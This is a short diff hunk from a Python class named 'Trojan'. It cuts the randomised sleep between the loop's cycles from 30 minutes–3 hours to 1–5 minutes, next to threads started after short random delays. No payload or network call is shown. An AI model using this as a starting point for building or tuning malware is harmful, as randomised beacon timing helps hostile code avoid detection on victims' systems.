@@ -88,7 +88,7 @@ class Trojan:
                 thread.start()
                 time.sleep(random.randint(1, 10))
 
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(60, 5*60))
 
 
 if __name__ == '__main__':
